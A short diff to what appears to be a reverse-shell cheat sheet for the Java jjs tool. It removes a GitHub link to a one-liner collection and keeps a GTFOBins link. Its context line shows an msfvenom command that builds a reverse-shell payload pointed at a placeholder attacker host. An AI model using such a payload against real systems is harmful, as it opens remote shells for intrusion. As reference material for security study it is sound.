@@ -17,10 +17,6 @@ $ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>
 ---
 ## References
 
-### Github
-
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
-
 ### GTFOBins
 
 - [GTFOBins: jjs](https://gtfobins.github.io/gtfobins/jjs/)
